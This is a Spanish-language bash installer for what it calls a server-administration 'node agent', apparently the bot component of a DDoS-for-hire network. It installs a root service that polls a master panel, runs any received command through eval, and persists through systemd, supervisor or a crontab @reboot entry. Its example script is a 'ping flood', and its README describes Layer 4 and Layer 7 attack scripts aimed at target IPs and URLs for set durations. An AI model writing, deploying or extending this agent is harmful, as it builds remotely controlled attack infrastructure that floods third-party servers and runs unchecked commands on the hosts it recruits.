#!/bin/bash
set -euo pipefail

# ============================================================
#  NODE AGENT INSTALLER v1.0
#  Sistema de Administración de Servidores
# ============================================================

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

banner() {
  echo -e "${CYAN}${BOLD}"
  echo "╔══════════════════════════════════════════════╗"
  echo "║        NODE AGENT INSTALLER v1.0             ║"
  echo "║    Sistema de Administración de Nodos        ║"
  echo "╚══════════════════════════════════════════════╝"
  echo -e "${NC}"
}

TOTAL=7
step() { echo -e "\n${GREEN}[${1}/${TOTAL}]${NC} ${BOLD}${2}${NC}"; }
info() { echo -e "  ${CYAN}→${NC} ${1}"; }
ok()   { echo -e "  ${GREEN}✔${NC} ${1}"; }
warn() { echo -e "  ${YELLOW}⚠${NC} ${1}"; }
err()  { echo -e "  ${RED}✘ ERROR:${NC} ${1}"; exit 1; }

INSTALL_DIR="/opt/node-agent"
CONFIG_FILE="$INSTALL_DIR/agent.conf"
SCRIPTS_DIR="$INSTALL_DIR/scripts"

banner

# ─── ROOT CHECK ──────────────────────────────────────────────
[ "$EUID" -ne 0 ] && err "Ejecutar como root: sudo bash install-node.sh"

# ─── DETECT ENVIRONMENT ──────────────────────────────────────
IS_CONTAINER=false
if [ -f /.dockerenv ] || grep -qa 'docker\|lxc\|container' /proc/1/cgroup 2>/dev/null || \
   [ "$(systemd-detect-virt 2>/dev/null)" = "lxc" ] || \
   [ "$(systemd-detect-virt 2>/dev/null)" = "docker" ]; then
  IS_CONTAINER=true
fi

if $IS_CONTAINER; then
  info "Entorno detectado: ${YELLOW}CONTAINER${NC} (Docker/LXC)"
else
  info "Entorno detectado: ${GREEN}VPS / BARE METAL${NC}"
fi

# ─── INTERACTIVE CONFIG ──────────────────────────────────────
echo ""
echo -e "${BOLD}Configuración del agente${NC}"
echo -e "${CYAN}──────────────────────────────────────────────${NC}"

# Master IP/URL
read -rp "  IP o dominio del Master (ej: 1.2.3.4 o panel.ejemplo.com): " MASTER_IP
MASTER_IP="${MASTER_IP:-}"
[ -z "$MASTER_IP" ] && err "Debes ingresar la IP o dominio del master"

# Strip protocol if user pasted a full URL
MASTER_IP="${MASTER_IP#http://}"
MASTER_IP="${MASTER_IP#https://}"
MASTER_IP="${MASTER_IP%%/*}"

# Agent token
read -rp "  AGENT_TOKEN (del master): " AGENT_TOKEN
AGENT_TOKEN="${AGENT_TOKEN:-}"
[ -z "$AGENT_TOKEN" ] && err "Debes ingresar el AGENT_TOKEN del master"

# Node name
DEFAULT_NAME="node-$(hostname | tr '[:upper:]' '[:lower:]' | tr -cd 'a-z0-9-' | cut -c1-16)"
read -rp "  Nombre del nodo [${DEFAULT_NAME}]: " NODE_NAME
NODE_NAME="${NODE_NAME:-$DEFAULT_NAME}"

# Master URL (default HTTP, user can change later in config)
MASTER_URL="http://${MASTER_IP}"

echo ""
info "Master URL: ${CYAN}${MASTER_URL}${NC}"
info "Nombre del nodo: ${CYAN}${NODE_NAME}${NC}"
echo ""

# ============================================================
# [1/7] SYSTEM DEPENDENCIES
# ============================================================
step 1 "Instalando dependencias del sistema..."

export DEBIAN_FRONTEND=noninteractive

# Detect package manager
if command -v apt-get &>/dev/null; then
  # Remove broken third-party repos that can block apt-get update
  # (e.g. Yarn GPG key expired in GitHub Codespaces / some containers)
  for f in /etc/apt/sources.list.d/yarn.list \
            /etc/apt/sources.list.d/github-cli.list \
            /etc/apt/sources.list.d/nodesource.list; do
    [ -f "$f" ] && { mv "$f" "${f}.bak" 2>/dev/null; info "Repo temporal desactivado: $(basename $f)"; }
  done

  # Update — tolerant: ignore individual repo failures, just warn
  apt-get update -qq 2>/dev/null || \
    apt-get update -qq -o APT::Update::Error-Mode=any 2>/dev/null || \
    apt-get update --allow-insecure-repositories -qq 2>/dev/null || \
    warn "apt-get update con errores parciales — continuando de todas formas"

  apt-get install -y curl procps bc jq 2>/dev/null || \
    apt-get install -y curl procps bc 2>/dev/null || \
    apt-get install -y --fix-missing curl procps bc 2>/dev/null
  ok "curl, procps, bc instalados (apt)"
elif command -v yum &>/dev/null; then
  yum install -y curl procps bc jq > /dev/null 2>&1 || \
    yum install -y curl procps bc > /dev/null 2>&1
  ok "curl, procps, bc instalados (yum)"
elif command -v apk &>/dev/null; then
  apk add --no-cache curl procps bc jq bash > /dev/null 2>&1
  ok "curl, procps, bc instalados (apk)"
else
  warn "Gestor de paquetes no reconocido — asegúrate de tener curl y bc instalados"
fi

# ============================================================
# [2/7] DIRECTORY STRUCTURE
# ============================================================
step 2 "Creando estructura de directorios..."

mkdir -p "$INSTALL_DIR" "$SCRIPTS_DIR"
ok "Directorios creados: $INSTALL_DIR  $SCRIPTS_DIR"

# ============================================================
# [3/7] CONFIGURATION FILE
# ============================================================
step 3 "Generando configuración del agente..."

# Generate a unique stable node ID (based on hostname + machine-id or random)
if [ -f /etc/machine-id ]; then
  NODE_ID=$(cat /etc/machine-id | cut -c1-16)
elif [ -f /proc/sys/kernel/random/boot_id ]; then
  NODE_ID=$(cat /proc/sys/kernel/random/boot_id | tr -d '-' | cut -c1-16)
else
  NODE_ID=$(openssl rand -hex 8)
fi
NODE_ID="node_${NODE_ID}"

cat > "$CONFIG_FILE" << CONFEOF
# ============================================================
#  NODE AGENT CONFIGURATION
#  Edita este archivo para cambiar la configuración
#  Reinicia el servicio después de editar:
#    systemctl restart node-agent   (VPS)
#    supervisorctl restart agent    (Container)
# ============================================================

# URL del Master Panel (sin barra final)
MASTER_URL=${MASTER_URL}

# Token de autenticación (debe coincidir con el del master)
AGENT_TOKEN=${AGENT_TOKEN}

# ID único del nodo (NO cambiar, es la identidad del nodo)
NODE_ID=${NODE_ID}

# Nombre visible en el panel
NODE_NAME=${NODE_NAME}

# Intervalo de polling en segundos (recomendado: 3-5)
POLL_INTERVAL=3

# Carpeta donde están los scripts a ejecutar
SCRIPTS_DIR=${SCRIPTS_DIR}

# Timeout máximo de conexión al master en segundos
CONNECT_TIMEOUT=10
CONFEOF

chmod 600 "$CONFIG_FILE"
ok "Configuración guardada en $CONFIG_FILE"

# ============================================================
# [4/7] AGENT SCRIPT
# ============================================================
step 4 "Creando agente (agent.sh)..."

cat > "$INSTALL_DIR/agent.sh" << 'AGENTEOF'
#!/bin/bash
# ============================================================
#  NODE AGENT — Sistema de Administración de Servidores
# ============================================================

CONFIG_FILE="$(dirname "$0")/agent.conf"

# Load config
if [ ! -f "$CONFIG_FILE" ]; then
  echo "[AGENT] ERROR: No se encontró $CONFIG_FILE" >&2
  exit 1
fi

source "$CONFIG_FILE"

# ─── DEFAULTS ─────────────────────────────────────────────
POLL_INTERVAL="${POLL_INTERVAL:-3}"
CONNECT_TIMEOUT="${CONNECT_TIMEOUT:-10}"
SCRIPTS_DIR="${SCRIPTS_DIR:-$(dirname "$0")/scripts}"
CURRENT_TASK_PID=""
CURRENT_TASK_ID=""

# ─── LOGGING ──────────────────────────────────────────────
log() {
  local level="$1"; shift
  echo "[$(date '+%Y-%m-%d %H:%M:%S')] [$level] $*"
}

# ─── CPU / RAM ────────────────────────────────────────────
get_cpu() {
  # Read two samples for accurate CPU %
  local cpu1 cpu2
  cpu1=$(grep -m1 '^cpu ' /proc/stat 2>/dev/null | awk '{print $2+$3+$4+$5+$6+$7+$8, $5+$6}')
  sleep 0.3
  cpu2=$(grep -m1 '^cpu ' /proc/stat 2>/dev/null | awk '{print $2+$3+$4+$5+$6+$7+$8, $5+$6}')
  if [ -n "$cpu1" ] && [ -n "$cpu2" ]; then
    local total1 idle1 total2 idle2
    total1=$(echo "$cpu1" | awk '{print $1}')
    idle1=$(echo "$cpu1" | awk '{print $2}')
    total2=$(echo "$cpu2" | awk '{print $1}')
    idle2=$(echo "$cpu2" | awk '{print $2}')
    local dtotal=$(( total2 - total1 ))
    local didle=$(( idle2 - idle1 ))
    if [ "$dtotal" -gt 0 ]; then
      echo "scale=1; (($dtotal - $didle) * 100) / $dtotal" | bc 2>/dev/null || echo "0"
      return
    fi
  fi
  # Fallback: top
  top -bn1 2>/dev/null | grep "Cpu(s)" | awk '{print 100-$8}' | tr -d '%' || echo "0"
}

get_ram() {
  if [ -f /proc/meminfo ]; then
    local total free buffers cached
    total=$(grep MemTotal /proc/meminfo | awk '{print $2}')
    free=$(grep MemFree /proc/meminfo | awk '{print $2}')
    buffers=$(grep Buffers /proc/meminfo | awk '{print $2}')
    cached=$(grep "^Cached:" /proc/meminfo | awk '{print $2}')
    local used=$(( total - free - buffers - cached ))
    [ "$total" -gt 0 ] && echo "scale=1; ($used * 100) / $total" | bc 2>/dev/null || echo "0"
  else
    echo "0"
  fi
}

# ─── HTTP HELPERS ─────────────────────────────────────────
agent_post() {
  local endpoint="$1"
  local body="$2"
  curl -s \
    --max-time "$CONNECT_TIMEOUT" \
    --connect-timeout 5 \
    -X POST \
    -H "Content-Type: application/json" \
    -H "x-agent-token: ${AGENT_TOKEN}" \
    -d "$body" \
    "${MASTER_URL}${endpoint}" 2>/dev/null
}

# ─── REGISTER ─────────────────────────────────────────────
register() {
  log "INFO" "Registrando en master: $MASTER_URL"
  local body
  body=$(printf '{"node_id":"%s","name":"%s"}' "$NODE_ID" "$NODE_NAME")
  local resp
  resp=$(agent_post "/api/agent/register" "$body")
  if echo "$resp" | grep -q '"success":true'; then
    log "OK" "Registrado correctamente como '$NODE_NAME' ($NODE_ID)"
    return 0
  else
    log "WARN" "Respuesta de registro: $resp"
    return 1
  fi
}

# ─── REPORT COMPLETE ──────────────────────────────────────
report_complete() {
  local task_id="$1"
  local success="$2"   # true / false
  local body
  body=$(printf '{"node_id":"%s","task_id":%s,"success":%s}' "$NODE_ID" "$task_id" "$success")
  agent_post "/api/agent/complete" "$body" > /dev/null
  log "INFO" "Tarea #${task_id} reportada al master (success=$success)"
}

# ─── EXECUTE TASK ─────────────────────────────────────────
execute_task() {
  local task_id="$1"
  local command="$2"
  local time_limit="$3"

  CURRENT_TASK_ID="$task_id"
  log "INFO" "Ejecutando tarea #${task_id} | tiempo: ${time_limit}s"
  log "INFO" "Comando: $command"

  # Run command from SCRIPTS_DIR, with timeout
  (
    cd "$SCRIPTS_DIR" || exit 1
    eval "$command"
  ) &
  CURRENT_TASK_PID=$!

  # Wait with timeout
  local elapsed=0
  while kill -0 "$CURRENT_TASK_PID" 2>/dev/null; do
    sleep 1
    elapsed=$(( elapsed + 1 ))
    if [ "$elapsed" -ge "$time_limit" ]; then
      log "INFO" "Tiempo límite alcanzado para tarea #${task_id} — matando proceso"
      kill -TERM "$CURRENT_TASK_PID" 2>/dev/null
      sleep 2
      kill -KILL "$CURRENT_TASK_PID" 2>/dev/null
      break
    fi
  done

  wait "$CURRENT_TASK_PID" 2>/dev/null
  local exit_code=$?
  CURRENT_TASK_PID=""
  CURRENT_TASK_ID=""

  # exit code 0 = success, 143 (SIGTERM) / killed by timeout = still success (finished on time)
  if [ "$exit_code" -eq 0 ] || [ "$exit_code" -eq 143 ] || [ "$elapsed" -ge "$time_limit" ]; then
    report_complete "$task_id" "true"
  else
    log "WARN" "Tarea #${task_id} falló con código: $exit_code"
    report_complete "$task_id" "false"
  fi
}

# ─── POLL LOOP ────────────────────────────────────────────
poll_loop() {
  local fail_count=0
  local max_fail=10

  while true; do
    local cpu ram body resp

    cpu=$(get_cpu)
    ram=$(get_ram)

    body=$(printf '{"node_id":"%s","cpu":%s,"ram":%s}' "$NODE_ID" "${cpu:-0}" "${ram:-0}")
    resp=$(agent_post "/api/agent/poll" "$body")

    if [ -z "$resp" ]; then
      fail_count=$(( fail_count + 1 ))
      if [ "$fail_count" -ge "$max_fail" ]; then
        log "WARN" "Master no responde ($fail_count intentos) — re-registrando..."
        register && fail_count=0
      fi
      sleep "$POLL_INTERVAL"
      continue
    fi

    fail_count=0

    # Check for cancel signal
    if echo "$resp" | grep -q '"cancel":true'; then
      local cancelled_id
      cancelled_id=$(echo "$resp" | grep -o '"task_id":[0-9]*' | head -1 | cut -d: -f2)
      log "WARN" "Tarea cancelada por master (task_id=$cancelled_id)"
      if [ -n "$CURRENT_TASK_PID" ] && kill -0 "$CURRENT_TASK_PID" 2>/dev/null; then
        log "INFO" "Matando proceso $CURRENT_TASK_PID..."
        kill -TERM "$CURRENT_TASK_PID" 2>/dev/null
        sleep 1
        kill -KILL "$CURRENT_TASK_PID" 2>/dev/null
        CURRENT_TASK_PID=""
        CURRENT_TASK_ID=""
      fi
      sleep "$POLL_INTERVAL"
      continue
    fi

    # Check for new task
    if echo "$resp" | grep -q '"task":{'; then
      local task_id task_time task_command
      task_id=$(echo "$resp" | grep -o '"id":[0-9]*' | head -1 | cut -d: -f2)
      task_time=$(echo "$resp" | grep -o '"time":[0-9]*' | head -1 | cut -d: -f2)
      # Extract command (between "command":" and the next unescaped ")
      task_command=$(echo "$resp" | python3 -c "
import sys, json
try:
    d = json.load(sys.stdin)
    print(d['task']['command'])
except:
    pass
" 2>/dev/null)

      if [ -n "$task_id" ] && [ -n "$task_command" ]; then
        execute_task "$task_id" "$task_command" "${task_time:-60}" &
        # Don't block the poll loop while task runs
        # (poll will return task:null while running anyway)
      fi
    fi

    sleep "$POLL_INTERVAL"
  done
}

# ─── SIGNALS ──────────────────────────────────────────────
cleanup() {
  log "INFO" "Señal de apagado recibida — limpiando..."
  if [ -n "$CURRENT_TASK_PID" ] && kill -0 "$CURRENT_TASK_PID" 2>/dev/null; then
    kill -TERM "$CURRENT_TASK_PID" 2>/dev/null
    [ -n "$CURRENT_TASK_ID" ] && report_complete "$CURRENT_TASK_ID" "false"
  fi
  exit 0
}
trap cleanup SIGTERM SIGINT SIGQUIT

# ─── MAIN ─────────────────────────────────────────────────
log "INFO" "=========================================="
log "INFO" "  NODE AGENT v1.0 arrancando"
log "INFO" "  Nodo  : $NODE_NAME ($NODE_ID)"
log "INFO" "  Master: $MASTER_URL"
log "INFO" "  Intervalo: ${POLL_INTERVAL}s"
log "INFO" "=========================================="

# Register on start, retry until master responds
while ! register; do
  log "WARN" "No se pudo conectar al master — reintentando en 10s..."
  sleep 10
done

# Re-register every 5 minutes to keep info fresh
(
  while true; do
    sleep 300
    register 2>/dev/null || true
  done
) &

poll_loop
AGENTEOF

chmod +x "$INSTALL_DIR/agent.sh"
ok "agent.sh creado"

# ============================================================
# [5/7] EXAMPLE SCRIPT
# ============================================================
step 5 "Creando script de ejemplo en scripts/..."

cat > "$SCRIPTS_DIR/example.sh" << 'EXEOF'
#!/bin/bash
# Ejemplo: ping flood básico
# Uso en métodos: -c {time} {ip}
TARGET="${1:-}"
SECONDS_ARG="${2:-30}"
[ -z "$TARGET" ] && { echo "Uso: example.sh <ip> <segundos>"; exit 1; }
echo "[$(date)] Iniciando ping a $TARGET por ${SECONDS_ARG}s"
timeout "$SECONDS_ARG" ping -i 0.2 "$TARGET" > /dev/null 2>&1 || true
echo "[$(date)] Finalizado"
EXEOF
chmod +x "$SCRIPTS_DIR/example.sh"

cat > "$SCRIPTS_DIR/README.txt" << 'RDEOF'
CARPETA DE SCRIPTS
==================
Coloca aquí los scripts que el master va a ordenar ejecutar.

El master enviará el comando ya armado, por ejemplo:
  ./scripts/attack.sh 1.2.3.4 80 60
  python3 scripts/flooder.py -h 1.2.3.4 -p 80 -t 60
  node scripts/layer7.js https://example.com 60

Los scripts se ejecutan con el directorio de trabajo = esta carpeta.

Variables disponibles en el panel de métodos:
  {ip}   → IP del objetivo (Layer 4)
  {url}  → URL del objetivo (Layer 7)
  {host} → alias de {ip} o {url}
  {port} → Puerto
  {time} → Tiempo en segundos
RDEOF

ok "Script de ejemplo y README creados en $SCRIPTS_DIR"

# ============================================================
# [6/7] AUTOSTART — systemd (VPS) o rc.local + script (Container)
# ============================================================
step 6 "Configurando inicio automático..."

if ! $IS_CONTAINER && command -v systemctl &>/dev/null; then
  # ── SYSTEMD (VPS / bare metal) ────────────────────────────
  cat > /etc/systemd/system/node-agent.service << SVCEOF
[Unit]
Description=Node Agent — Sistema de Administración de Nodos
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
User=root
WorkingDirectory=${INSTALL_DIR}
ExecStart=/bin/bash ${INSTALL_DIR}/agent.sh
Restart=always
RestartSec=5
StandardOutput=journal
StandardError=journal
SyslogIdentifier=node-agent
KillMode=process
TimeoutStopSec=10

[Install]
WantedBy=multi-user.target
SVCEOF

  systemctl daemon-reload
  systemctl enable node-agent > /dev/null 2>&1
  ok "Servicio systemd configurado (node-agent)"
  STARTUP_TYPE="systemd"

else
  # ── CONTAINER — sin systemd completo ─────────────────────
  # Intentar supervisor si está disponible
  if command -v supervisord &>/dev/null || command -v apt-get &>/dev/null; then
    apt-get install -y supervisor > /dev/null 2>&1 || true
  fi

  if command -v supervisorctl &>/dev/null; then
    mkdir -p /etc/supervisor/conf.d
    cat > /etc/supervisor/conf.d/node-agent.conf << SUPEOF
[program:agent]
command=/bin/bash ${INSTALL_DIR}/agent.sh
directory=${INSTALL_DIR}
autostart=true
autorestart=true
startsecs=3
startretries=999
stdout_logfile=/var/log/node-agent.log
stdout_logfile_maxbytes=10MB
stdout_logfile_backups=2
stderr_logfile=/var/log/node-agent.err
stderr_logfile_maxbytes=5MB
redirect_stderr=false
SUPEOF
    ok "Supervisor configurado para el agente"
    STARTUP_TYPE="supervisor"

  else
    # Fallback: crontab @reboot
    ( crontab -l 2>/dev/null | grep -v "node-agent" ; \
      echo "@reboot sleep 10 && /bin/bash ${INSTALL_DIR}/agent.sh >> /var/log/node-agent.log 2>&1 &" \
    ) | crontab -
    ok "Crontab @reboot configurado (fallback)"
    STARTUP_TYPE="crontab"
  fi

  # También crear un wrapper de inicio para docker ENTRYPOINT / CMD
  cat > "$INSTALL_DIR/start.sh" << STARTEOF
#!/bin/bash
# Wrapper de inicio para contenedores Docker/LXC
# Úsalo como ENTRYPOINT o CMD en tu Dockerfile:
#   CMD ["/opt/node-agent/start.sh"]
echo "[START] Iniciando Node Agent..."
exec /bin/bash /opt/node-agent/agent.sh
STARTEOF
  chmod +x "$INSTALL_DIR/start.sh"
  ok "start.sh creado para uso como Docker ENTRYPOINT"
fi

# ── Logrotate ─────────────────────────────────────────────
cat > /etc/logrotate.d/node-agent << 'LOGREOF'
/var/log/node-agent.log /var/log/node-agent.err {
    daily
    rotate 7
    compress
    missingok
    notifempty
    copytruncate
}
LOGREOF

# ============================================================
# [7/7] START AGENT
# ============================================================
step 7 "Iniciando el agente..."

case "$STARTUP_TYPE" in
  systemd)
    systemctl start node-agent
    sleep 3
    if systemctl is-active --quiet node-agent; then
      ok "node-agent corriendo correctamente"
    else
      warn "Servicio no inició — revisa: journalctl -u node-agent -n 30"
    fi
    ;;
  supervisor)
    supervisord -c /etc/supervisor/supervisord.conf > /dev/null 2>&1 || true
    supervisorctl reread > /dev/null 2>&1 || true
    supervisorctl update > /dev/null 2>&1 || true
    supervisorctl start agent > /dev/null 2>&1 || true
    sleep 3
    if supervisorctl status agent 2>/dev/null | grep -q "RUNNING"; then
      ok "Agente corriendo via supervisor"
    else
      warn "Iniciando agente en background..."
      nohup /bin/bash "$INSTALL_DIR/agent.sh" >> /var/log/node-agent.log 2>&1 &
      ok "Agente iniciado (PID: $!)"
    fi
    ;;
  crontab)
    nohup /bin/bash "$INSTALL_DIR/agent.sh" >> /var/log/node-agent.log 2>&1 &
    ok "Agente iniciado en background (PID: $!)"
    ;;
esac

# ============================================================
# SUMMARY
# ============================================================
echo ""
echo -e "${CYAN}${BOLD}"
echo "╔═══════════════════════════════════════════════════════╗"
echo "║           INSTALACIÓN COMPLETADA ✅                   ║"
echo "╠═══════════════════════════════════════════════════════╣"
printf "║  Nodo       →  %-39s ║\n" "$NODE_NAME"
printf "║  Node ID    →  %-39s ║\n" "$NODE_ID"
printf "║  Master     →  %-39s ║\n" "$MASTER_URL"
echo "║                                                       ║"
printf "║  Config     →  %-39s ║\n" "$CONFIG_FILE"
printf "║  Scripts    →  %-39s ║\n" "$SCRIPTS_DIR"
printf "║  Startup    →  %-39s ║\n" "$STARTUP_TYPE"
echo "╠═══════════════════════════════════════════════════════╣"
echo "║  Comandos útiles:                                     ║"

if [ "$STARTUP_TYPE" = "systemd" ]; then
echo "║   systemctl status node-agent                         ║"
echo "║   journalctl -u node-agent -f                         ║"
echo "║   systemctl restart node-agent                        ║"
elif [ "$STARTUP_TYPE" = "supervisor" ]; then
echo "║   supervisorctl status agent                          ║"
echo "║   supervisorctl restart agent                         ║"
echo "║   tail -f /var/log/node-agent.log                     ║"
else
echo "║   tail -f /var/log/node-agent.log                     ║"
echo "║   pkill -f agent.sh   (detener)                       ║"
fi

echo "║                                                       ║"
echo "║  Para cambiar master IP o token:                      ║"
printf "║   nano %-47s ║\n" "$CONFIG_FILE"
echo "╚═══════════════════════════════════════════════════════╝"
echo -e "${NC}"
echo -e "${YELLOW}⚠ El nodo debería aparecer en el panel en ~5 segundos${NC}"
echo -e "${YELLOW}  Coloca tus scripts en: ${CYAN}${SCRIPTS_DIR}/${NC}"
echo ""
